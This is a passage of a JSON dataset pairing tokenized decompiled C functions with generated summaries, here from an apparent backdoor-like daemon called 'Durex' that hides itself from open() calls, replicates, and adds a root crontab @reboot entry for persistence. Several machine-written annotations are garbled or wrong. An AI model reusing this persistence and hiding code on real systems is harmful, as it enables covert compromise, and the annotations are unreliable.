            "path",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "oflag",
            ",",
            "mode",
            ")",
            ";",
            "else",
            "return",
            "syscall",
            "(",
            "2L",
            "L",
            ",",
            "path",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "oflag",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code appears to be a simplified implementation of the `open` system call, where it checks for a virus in the file path, hides it if found, and then invokes the system call with the appropriate parameters including file path, flags, and mode if provided."
    },
    {
        "id": 113,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "returns",
            "the",
            "current",
            "time",
            "in",
            "milliseconds",
            "by",
            "using",
            "the",
            "gettimeofday",
            "function",
            "from",
            "the",
            "<",
            "sys/time.h",
            ">",
            "library",
            "."
        ],
        "code_tokens": [
            "size_t",
            "__cdecl",
            "FUN0",
            "(",
            ")",
            "{",
            "timeval",
            "tv",
            ";",
            "unsigned",
            "__int64",
            "v2",
            ";",
            "v2",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "gettimeofday",
            "(",
            "&",
            "tv",
            ",",
            "0L",
            "L",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "perror",
            "(",
            "\"gettimeofday\"",
            ")",
            ";",
            "exit",
            "(",
            "2",
            ")",
            ";",
            "}",
            "return",
            "1000",
            "*",
            "tv",
            ".",
            "tv_sec",
            "+",
            "tv",
            ".",
            "tv_usec",
            "/",
            "1000",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"__readfsqword\" is likely used to read a 64-bit quadword (8 bytes) from the FS (segment) register on x86 architecture, often utilized in low-level system programming for accessing thread information or processor-specific data structures.",
            "The perror function is used to print a descriptive error message to the standard error stream, indicating the error encountered in the program, typically after a system call failure, with a string provided as an argument, as shown in the provided code snippets."
        ],
        "longer_label": "The given code defines a function \"time_ms\" which utilizes \"__readfsqword\" to read a 64-bit value from the FS register, then calls \"gettimeofday\" to get the current time in microseconds, converting it to milliseconds and returning it, while handling errors with \"perror\" and exiting if \"gettimeofday\" fails."
    },
    {
        "id": 114,
        "docstring_tokens": [
            "This",
            "code",
            "is",
            "a",
            "function",
            "that",
            "frees",
            "memory",
            "associated",
            "with",
            "a",
            "client",
            "node",
            ",",
            "closes",
            "the",
            "client",
            "socket",
            ",",
            "kills",
            "any",
            "forked",
            "process",
            "associated",
            "with",
            "the",
            "client",
            ",",
            "and",
            "sets",
            "the",
            "node",
            "to",
            "NULL",
            "."
        ],
        "code_tokens": [
            "void",
            "*",
            "FUN0",
            "client_free",
            "(",
            "int",
            "*",
            "*",
            "a1",
            ")",
            "{",
            "void",
            "*",
            "result",
            ";",
            "result",
            "=",
            "*",
            "a1",
            ";",
            "if",
            "(",
            "*",
            "a1",
            ")",
            "{",
            "if",
            "(",
            "(",
            "*",
            "a1",
            ")",
            "[",
            "20",
            "]",
            "!",
            "=",
            "-",
            "1",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Killing forked process manually (SIGTERM)\"",
            ")",
            ";",
            "kill",
            "(",
            "(",
            "*",
            "a1",
            ")",
            "[",
            "20",
            "]",
            ",",
            "15",
            ")",
            ";",
            "}",
            "if",
            "(",
            "close",
            "(",
            "*",
            "*",
            "a1",
            ")",
            "!",
            "=",
            "-",
            "1",
            ")",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Client socket closed.\"",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "*",
            "a1",
            "+",
            "9",
            ")",
            ")",
            "free",
            "(",
            "*",
            "(",
            "(",
            "void",
            "*",
            "*",
            ")",
            "*",
            "a1",
            "+",
            "9",
            ")",
            ")",
            ";",
            "free",
            "(",
            "*",
            "a1",
            ")",
            ";",
            "result",
            "=",
            "a1",
            ";",
            "*",
            "a1",
            "=",
            "0L",
            "L",
            ";",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code is a function named `client_free` which deallocates memory associated with a client socket, closes the socket, kills a forked process if necessary, and sets the pointer to null."
    },
    {
        "id": 115,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "to",
            "free",
            "a",
            "client",
            "node",
            "in",
            "a",
            "linked",
            "list",
            "of",
            "clients",
            "based",
            "on",
            "a",
            "given",
            "socket",
            ",",
            "updating",
            "the",
            "head",
            "of",
            "the",
            "list",
            "if",
            "necessary",
            "."
        ],
        "code_tokens": [
            "void",
            "*",
            "FUN0",
            "client_ofree",
            "(",
            "int",
            "*",
            "*",
            "a1",
            ",",
            "int",
            "a2",
            ")",
            "{",
            "void",
            "*",
            "result",
            ";",
            "int",
            "*",
            "v3",
            ";",
            "int",
            "*",
            "v4",
            ";",
            "__int64",
            "v5",
            ";",
            "result",
            "=",
            "*",
            "a1",
            ";",
            "v3",
            "=",
            "*",
            "a1",
            ";",
            "if",
            "(",
            "*",
            "a1",
            ")",
            "{",
            "if",
            "(",
            "a2",
            "=",
            "=",
            "*",
            "*",
            "a1",
            ")",
            "{",
            "v4",
            "=",
            "(",
            "int",
            "*",
            ")",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "*",
            "a1",
            "+",
            "11",
            ")",
            ";",
            "client_free",
            "(",
            "a1",
            ")",
            ";",
            "result",
            "=",
            "a1",
            ";",
            "*",
            "a1",
            "=",
            "v4",
            ";",
            "}",
            "else",
            "{",
            "while",
            "(",
            "1",
            ")",
            "{",
            "result",
            "=",
            "(",
            "void",
            "*",
            ")",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "v3",
            "+",
            "11",
            ")",
            ";",
            "if",
            "(",
            "!",
            "result",
            ")",
            "break",
            ";",
            "if",
            "(",
            "a2",
            "=",
            "=",
            "*",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            "*",
            ")",
            "v3",
            "+",
            "11",
            ")",
            ")",
            "{",
            "v5",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "v3",
            "+",
            "11",
            ")",
            "+",
            "88L",
            "L",
            ")",
            ";",
            "client_free",
            "(",
            "(",
            "int",
            "*",
            "*",
            ")",
            "v3",
            "+",
            "11",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "v3",
            "+",
            "11",
            ")",
            "=",
            "v5",
            ";",
            "}",
            "else",
            "{",
            "v3",
            "=",
            "(",
            "int",
            "*",
            ")",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "v3",
            "+",
            "11",
            ")",
            ";",
            "}",
            "}",
            "}",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `client` function is likely part of a distributed system or network application, responsible for handling client-side operations such as data retrieval (`getData`), IP address acquisition (`getIPAddr`), range checking (`inBetween`), and MD5 computation (`compute_md5`), while also including auxiliary functions for WebSocket client attachment and Infrared (IR) thread handling."
        ],
        "longer_label": "The provided code appears to be a function called `client_ofree` likely associated with a client-side component of a distributed system or network application, responsible for freeing memory associated with client operations, with additional functions possibly related to data retrieval, IP address acquisition, range checking, MD5 computation, WebSocket client attachment, and Infrared (IR) thread handling."
    },
    {
        "id": 116,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "frees",
            "memory",
            "allocated",
            "to",
            "a",
            "linked",
            "list",
            "of",
            "client",
            "structures",
            "."
        ],
        "code_tokens": [
            "unsigned",
            "__int64",
            "FUN0",
            "client_lfree",
            "(",
            "int",
            "*",
            "*",
            "a1",
            ")",
            "{",
            "int",
            "*",
            "i",
            ";",
            "int",
            "*",
            "v3",
            ";",
            "unsigned",
            "__int64",
            "v4",
            ";",
            "v4",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "*",
            "a1",
            ")",
            "{",
            "for",
            "(",
            "i",
            "=",
            "*",
            "a1",
            ";",
            "i",
            ";",
            "i",
            "=",
            "v3",
            ")",
            "{",
            "v3",
            "=",
            "(",
            "int",
            "*",
            ")",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "i",
            "+",
            "11",
            ")",
            ";",
            "client_free",
            "(",
            "&",
            "i",
            ")",
            ";",
            "}",
            "}",
            "return",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            "^",
            "v4",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is used to read a 64-bit unsigned integer from a specific offset within the FS segment register, commonly utilized for low-level system programming or accessing thread information in Windows environments.",
            "The function `readfsqword` likely reads a quadword (64 bits) from the segment register FS, typically used for thread-local storage or operating system specific data, and is part of low-level system programming often encountered in OS kernel development."
        ],
        "longer_label": "The `client_lfree` function iterates through a list of integers pointed to by `a1`, freeing each element and finally returning the result of an XOR operation involving two `__readfsqword` calls, which likely aims to ensure thread safety or integrity of data in a Windows environment."
    },
    {
        "id": 117,
        "docstring_tokens": [
            "The",
            "code",
            "daemonizes",
            "a",
            "process",
            ",",
            "checks",
            "if",
            "the",
            "user",
            "is",
            "root",
            ",",
            "forks",
            "a",
            "child",
            "process",
            ",",
            "sets",
            "up",
            "a",
            "new",
            "process",
            "group",
            ",",
            "changes",
            "file",
            "mask",
            "to",
            "0",
            ",",
            "changes",
            "working",
            "directory",
            "to",
            "root",
            ",",
            "closes",
            "standard",
            "I/O",
            ",",
            "and",
            "sets",
            "up",
            "the",
            "daemon",
            "as",
            "a",
            "cron",
            "job",
            "on",
            "OS",
            "startup",
            "."
        ],
        "code_tokens": [
            "unsigned",
            "__int64",
            "FUN0",
            "(",
            ")",
            "{",
            "__pid_t",
            "v1",
            ";",
            "int",
            "fd",
            ";",
            "char",
            "*",
            "haystack",
            ";",
            "struct",
            "stat",
            "buf",
            ";",
            "char",
            "s",
            "[",
            "8",
            "]",
            ";",
            "__int64",
            "v6",
            ";",
            "__int64",
            "v7",
            ";",
            "__int64",
            "v8",
            ";",
            "__int64",
            "v9",
            ";",
            "__int64",
            "v10",
            ";",
            "__int64",
            "v11",
            ";",
            "__int64",
            "v12",
            ";",
            "unsigned",
            "__int64",
            "v13",
            ";",
            "v13",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "s",
            "=",
            "0L",
            "L",
            ";",
            "v6",
            "=",
            "0L",
            "L",
            ";",
            "v7",
            "=",
            "0L",
            "L",
            ";",
            "v8",
            "=",
            "0L",
            "L",
            ";",
            "v9",
            "=",
            "0L",
            "L",
            ";",
            "v10",
            "=",
            "0L",
            "L",
            ";",
            "v11",
            "=",
            "0L",
            "L",
            ";",
            "v12",
            "=",
            "0L",
            "L",
            ";",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Daemonizing Durex...\"",
            ")",
            ";",
            "if",
            "(",
            "geteuid",
            "(",
            ")",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ ERROR ]\"",
            ",",
            "\"Unable to start daemon. Not root user.\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "v1",
            "=",
            "fork",
            "(",
            ")",
            ";",
            "if",
            "(",
            "v1",
            "<",
            "0",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ ERROR ]\"",
            ",",
            "\"Durex process fork failed.\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "if",
            "(",
            "v1",
            ">",
            "0",
            ")",
            "exit",
            "(",
            "0",
            ")",
            ";",
            "g_durex",
            "=",
            "getpid",
            "(",
            ")",
            ";",
            "sprintf",
            "(",
            "s",
            ",",
            "\"Daemon has PID : %d\"",
            ",",
            "g_durex",
            ")",
            ";",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "s",
            ")",
            ";",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Requesting new process group...\"",
            ")",
            ";",
            "if",
            "(",
            "setsid",
            "(",
            ")",
            "<",
            "0",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ ERROR ]\"",
            ",",
            "\"Unable to get a new process group.\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"New process group obtained.\"",
            ")",
            ";",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Changing file mask to 0...\"",
            ")",
            ";",
            "umask",
            "(",
            "0",
            ")",
            ";",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"File mask changed.\"",
            ")",
            ";",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Changing working directory to root...\"",
            ")",
            ";",
            "if",
            "(",
            "chdir",
            "(",
            "\"/\"",
            ")",
            "<",
            "0",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ ERROR ]\"",
            ",",
            "\"Unable to move to root directory\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Working directory changed.\"",
            ")",
            ";",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Closing standard I/O...\"",
            ")",
            ";",
            "if",
            "(",
            "close",
            "(",
            "0",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ ERROR ]\"",
            ",",
            "\"Unable to close stdin.\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "if",
            "(",
            "close",
            "(",
            "1",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ ERROR ]\"",
            ",",
            "\"Unable to close stdout\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "if",
            "(",
            "close",
            "(",
            "2",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ ERROR ]\"",
            ",",
            "\"Unable to close stderr\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Standard I/O closed.\"",
            ")",
            ";",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Daemon running.\"",
            ")",
            ";",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Setting up daemon as cron on OS startup...\"",
            ")",
            ";",
            "fd",
            "=",
            "open",
            "(",
            "\"/var/spool/cron/crontabs/root\"",
            ",",
            "66",
            ",",
            "384L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "fd",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ ERROR ]\"",
            ",",
            "\"Unable to open crontab.\"",
            ")",
            ";",
            "}",
            "else",
            "{",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Crontab opened. Searching for daemon crontab event...\"",
            ")",
            ";",
            "if",
            "(",
            "fstat",
            "(",
            "fd",
            ",",
            "&",
            "buf",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ ERROR ]\"",
            ",",
            "\"Unable to fstat crontab. Aborting.\"",
            ")",
            ";",
            "close",
            "(",
            "fd",
            ")",
            ";",
            "}",
            "else",
            "{",
            "haystack",
            "=",
            "(",
            "char",
            "*",
            ")",
            "malloc",
            "(",
            "buf",
            ".",
            "st_size",
            ")",
            ";",
            "if",
            "(",
            "haystack",
            ")",
            "{",
            "read",
            "(",
            "fd",
            ",",
            "haystack",
            ",",
            "buf",
            ".",
            "st_size",
            ")",
            ";",
            "if",
            "(",
            "strstr",
            "(",
            "haystack",
            ",",
            "\"@reboot /usr/sbin/Durex\"",
            ")",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ ERROR ]\"",
            ",",
            "\"Daemon crontab event exists. Aborting.\"",
            ")",
            ";",
            "free",
            "(",
            "haystack",
            ")",
            ";",
            "close",
            "(",
            "fd",
            ")",
            ";",
            "}",
            "else",
            "{",
            "free",
            "(",
            "haystack",
            ")",
            ";",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Daemon crontab event not found. Adding it to crontab...\"",
            ")",
            ";",
            "lseek",
            "(",
            "fd",
            ",",
            "0L",
            "L",
            ",",
            "2",
            ")",
            ";",
            "write",
            "(",
            "fd",
            ",",
            "\"@reboot /usr/sbin/Durex\\n\"",
            ",",
            "0x18uL",
            "L",
            ")",
            ";",
            "close",
            "(",
            "fd",
            ")",
            ";",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Daemon crontab event added.\"",
            ")",
            ";",
            "}",
            "}",
            "else",
            "{",
            "daemon_report",
            "(",
            "\"[ ERROR ]\"",
            ",",
            "\"Unable to map crontab. Aborting.\"",
            ")",
            ";",
            "close",
            "(",
            "fd",
            ")",
            ";",
            "}",
            "}",
            "}",
            "return",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            "^",
            "v13",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__read` appears to be used in various contexts, potentially for file system operations, device interaction, or library initialization, as indicated by its implementations with file I/O operations, device reads, and library function declarations.",
            "The \"qword\" function likely deals with operations or manipulations involving quadruple-precision floating-point numbers, typically represented as 64 bits, given the naming convention \"q\" possibly denoting \"quad\" or \"quadruple.\"",
            "The `getpid` function is being declared multiple times across different code snippets with various includes and typedefs, suggesting it is intended to retrieve the process ID, which is a unique identifier assigned to a process when it is created, but the exact implementation and purpose are unclear due to the inconsistent declarations and missing function definitions."
        ],
        "longer_label": "The provided code appears to be a C function designed to daemonize a process by forking, setting up a new process group, closing standard I/O, changing working directory to root, and configuring a cron job to run the daemon on OS startup, with annotations suggesting involvement of file system operations, device interaction, and process ID retrieval."
    },
    {
        "id": 118,
        "docstring_tokens": [
            "The",
            "main",
            "function",
            "sets",
            "up",
            "a",
            "signal",
            ",",
            "checks",
            "the",
            "path",
            ",",
            "and",
            "either",
            "writes",
            "a",
            "message",
            "and",
            "daemonizes",
            "if",
            "the",
            "path",
            "check",
            "fails",
            ",",
            "or",
            "replicates",
            "and",
            "sets",
            "a",
            "lock",
            "before",
            "creating",
            "a",
            "server",
            "and",
            "handling",
            "connections",
            ",",
            "destroying",
            "the",
            "server",
            ",",
            "unsetting",
            "the",
            "lock",
            ",",
            "and",
            "returning",
            "0",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "argc",
            ",",
            "const",
            "char",
            "*",
            "*",
            "argv",
            ",",
            "const",
            "char",
            "*",
            "*",
            "envp",
            ")",
            "{",
            "signal_setup",
            "(",
            "argc",
            ",",
            "argv",
            ",",
            "envp",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "checkpath",
            "(",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "write",
            "(",
            "1",
            ",",
            "\"rludosan-nidzik\\n\"",
            ",",
            "0x10uL",
            "L",
            ")",
            ";",
            "daemonize",
            "(",
            ")",
            ";",
            "}",
            "else",
            "{",
            "replicate",
            "(",
            ")",
            ";",
            "}",
            "set_lock",
            "(",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "server_create",
            "(",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "unset_lock",
            "(",
            ")",
            ";",
            "return",
            "1",
            ";",
            "}",
            "else",
            "{",
            "server_handle_connections",
            "(",
            ")",
            ";",
            "server_destroy",
            "(",
            ")",
            ";",
            "unset_lock",
            "(",
            ")",
            ";",
            "return",
            "0",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `signal` in the provided code snippets is likely used to establish signal handling behavior, such as defining signal handlers for specific signals, within a program, possibly for synchronization or inter-process communication purposes in a multi-threaded or multi-process environment.",
            "The function \"setup\" likely initializes various components and configurations, such as XCB atoms, IPC and event handlers, RandR setup, key bindings, GPIO pins, and possibly other system-level settings.",
            "The \"write\" function appears to be a part of a custom file handling library implemented in C, providing functionalities such as file opening, reading, writing, seeking, and memory mapping, with support for managing file descriptors and memory allocation.",
            "The `unset_lock` function is likely intended to release a lock, possibly a pthread mutex lock, in a multi-threaded program, ensuring proper synchronization and allowing other threads to access shared resources.",
            "This function likely handles and manages connections to a server, and may also deal with destroying and unsetting server resources."
        ],
        "longer_label": "The provided code appears to be a C program that sets up signal handling, checks a path, and then either runs as a daemon process or replicates itself, followed by creating a server and handling connections until termination."
    },
    {
        "id": 119,
        "docstring_tokens": [
            "The",
            "function",
            "initializes",
            "the",
            "key",
            "values",
            "and",
            "sets",
            "the",
            "client",
            "'s",
            "shared",
            "key",
            "to",
            "0",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ")",
            "{",
            "unsigned",
            "int",
            "v1",
            ";",
            "__int64",
            "result",
            ";",
            "v1",
            "=",
            "time",
            "(",
            "0L",
            "L",
            ")",
            ";",
            "srand",
            "(",
            "v1",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "8",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "16",
            ")",
            "=",
            "5L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "24",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "32",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "40",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "48",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "result",
            "=",
            "a1",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "56",
            ")",
            "=",
            "0",
            ";",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code initializes a key with specific values and sets the seed for the random number generator using the current time."
    },
    {
        "id": 120,
        "docstring_tokens": [
            "The",
            "code",
            "generates",
            "a",
            "shared",
            "key",
            "for",
            "a",
            "client",
            "using",
            "a",
            "Diffie-Hellman",
            "key",
            "exchange",
            "algorithm",
            ",",
            "checking",
            "for",
            "prime",
            "numbers",
            "and",
            "verifying",
            "the",
            "shared",
            "key",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "const",
            "char",
            "*",
            "a2",
            ")",
            "{",
            "size_t",
            "v3",
            ";",
            "size_t",
            "v4",
            ";",
            "int",
            "v5",
            ";",
            "char",
            "*",
            "s",
            ";",
            "char",
            "*",
            "v7",
            ";",
            "char",
            "*",
            "s2",
            ";",
            "v5",
            "=",
            "0",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "8",
            ")",
            ")",
            "{",
            "if",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "32",
            ")",
            ")",
            "{",
            "if",
            "(",
            "!",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "48",
            ")",
            ")",
            "{",
            "s2",
            "=",
            "(",
            "char",
            "*",
            ")",
            "ft_itoa_a",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "32",
            ")",
            "-",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "40",
            ")",
            ",",
            "10L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "s2",
            ")",
            "return",
            "4294967294L",
            "L",
            ";",
            "if",
            "(",
            "strcmp",
            "(",
            "a2",
            ",",
            "s2",
            ")",
            ")",
            "{",
            "puts",
            "(",
            "\"signature diff\"",
            ")",
            ";",
            "free",
            "(",
            "s2",
            ")",
            ";",
            "return",
            "4294967294L",
            "L",
            ";",
            "}",
            "free",
            "(",
            "s2",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "48",
            ")",
            "=",
            "powmodp",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "32",
            ")",
            ",",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "24",
            ")",
            ",",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "8",
            ")",
            ")",
            ";",
            "}",
            "}",
            "else",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "32",
            ")",
            "=",
            "ft_atollu",
            "(",
            "a2",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "24",
            ")",
            "=",
            "rand_uint64",
            "(",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "40",
            ")",
            "=",
            "powmodp",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "16",
            ")",
            ",",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "24",
            ")",
            ",",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "8",
            ")",
            ")",
            ";",
            "if",
            "(",
            "!",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "40",
            ")",
            ")",
            "return",
            "4294967294L",
            "L",
            ";",
            "v7",
            "=",
            "(",
            "char",
            "*",
            ")",
            "ft_itoa_a",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "40",
            ")",
            ",",
            "10L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v7",
            ")",
            "return",
            "4294967294L",
            "L",
            ";",
            "v4",
            "=",
            "strlen",
            "(",
            "v7",
            ")",
            ";",
            "if",
            "(",
            "write",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "a1",
            ",",
            "v7",
            ",",
            "v4",
            ")",
            "<",
            "0",
            ")",
            "{",
            "free",
            "(",
            "v7",
            ")",
            ";",
            "return",
            "4294967294L",
            "L",
            ";",
            "}",
            "free",
            "(",
            "v7",
            ")",
            ";",
            "}",
            "}",
            "else",
            "{",
            "while",
            "(",
            "1",
            ")",
            "{",
            "+",
            "+",
            "v5",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "8",
            ")",
            "=",
            "rand_uint64",
            "(",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "is_prime",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "8",
            ")",
            ")",
            ")",
            "break",
            ";",
            "if",
            "(",
            "v5",
            "=",
            "=",
            "500",
            ")",
            "return",
            "4294967294L",
            "L",
            ";",
            "}",
            "s",
            "=",
            "(",
            "char",
            "*",
            ")",
            "ft_itoa_a",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "8",
            ")",
            ",",
            "10L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "s",
            ")",
            "return",
            "4294967294L",
            "L",
            ";",
            "v3",
            "=",
            "strlen",
            "(",
            "s",
            ")",
            ";",
            "if",
            "(",
            "write",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "a1",
            ",",
            "s",
            ",",
            "v3",
            ")",
            "<",
            "0",
            ")",
            "{",
            "free",
            "(",
            "s",
            ")",
            ";",
            "return",
            "4294967294L",
            "L",
            ";",
            "}",
            "}",
            "if",
            "(",
            "!",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "48",
            ")",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "56",
            ")",
            "=",
            "1",
            ";",
            "return",
            "1L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
